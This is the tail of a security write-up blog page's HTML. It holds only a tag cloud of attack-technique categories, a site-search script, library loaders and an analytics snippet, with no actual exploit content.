col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/tcp-80-http-web-app-cms-exploit/">tcp/80-http/web-app-cms-exploit</a> <a class="post-tag" href="/tags/linux-priv-esc-linux-creds-found/">linux-priv-esc/linux-creds-found</a> <a class="post-tag" href="/tags/exploit-file-inclusion-lfi/">exploit/file-inclusion/lfi</a> <a class="post-tag" href="/tags/linux-priv-esc-sudo-gtfo-bin/">linux-priv-esc/sudo/gtfo-bin</a> <a class="post-tag" href="/tags/exploit-command-injection/">exploit/command-injection</a> <a class="post-tag" href="/tags/linux-priv-esc-kernel-exploit/">linux-priv-esc/kernel-exploit</a> <a class="post-tag" href="/tags/cryptography/">cryptography</a> <a class="post-tag" href="/tags/exploit-sqli-database-enum/">exploit/sqli/database-enum</a> <a class="post-tag" href="/tags/pivot/">pivot</a> <a class="post-tag" href="/tags/exploit-file-upload-bypass/">exploit/file-upload-bypass</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LS5TVPBBZE"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LS5TVPBBZE'); }); </script>
